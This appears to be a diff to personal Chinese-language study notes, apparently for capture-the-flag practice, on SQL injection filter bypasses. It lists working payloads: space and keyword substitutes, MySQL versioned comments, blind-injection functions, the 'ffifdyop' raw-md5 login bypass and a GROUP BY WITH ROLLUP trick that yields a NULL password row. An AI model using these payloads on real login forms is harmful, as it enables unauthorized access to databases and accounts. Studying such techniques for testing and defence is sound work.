@@ -10,14 +10,47 @@ Created 星期六 30 十一月 2024
 空格: %20
 空格：行内注释 /*...*/， 如 id=1'or/**/1=1
 空格：%09 即 \t
+空格：select(username)from(table)where(key='val')
+空格（mysql专用）：/*!UNION*//*!SELECT*/...
 单引号：双引号
 AND: &&  且换成符号后不需要两边加空格
 OR: ||
 1=1: (true)  如 username='a'or(true)
 1=2: (false)  如 username='a'and(false)
 
+information_schema.tables: information_schema/**/.tables  或  information_schema.`tables`
+
 禁止逗号、union、select等关键词：使用**盲注**。
 配合常用函数进行爆破，根据有无回显判断取值是否为真。
 length(str)
 substr(str FROM pos FOR len)   （pos从1开始）
 ascii(char)
+
+md5绕过
+二进制结果编码后以 '''or'数字'' 开头，只有数字会被当作strue：
+ffifdyop
+'or'6xxx
+129581926211651571912466741651878684928
+xxx'or'8
+
+
+https://dev.mysql.com/doc/refman/8.4/en/group-by-modifiers.html
+虚拟表绕过
+GROUP BY col1 **WITH ROLLUP**: 生成结果包含NULL值，方便绕过密码
+如 ''username=1' or 1=1 GROUP BY password&password=''
+对应php代码为先查询username，然后判断 ''$password==$row['password']''
+原理：
+新增一行汇总行，其中被GROUP BY的列（e.g col1）值为NULL，其他列为求和
+如 ''mysql> SELECT year, SUM(profit) AS profit''
+	   ''FROM sales''
+	   ''GROUP BY year WITH ROLLUP;''
+''+------+--------+''
+''| year | profit |''
+''+------+--------+''
+''| 2000 |   4525 |''
+''| 2001 |   3010 |''
+''| NULL |   7535 |''
+''+------+--------+''
+如果指定GROUP BY了多个列，则对这些列全排列，分别置NULL（包括全为NULL）
+（如果sql_mode设置的有ONLY_FULL_GROUP_BY，则非数值列不能group py）
+非数值列求和结果是只保留第一个值
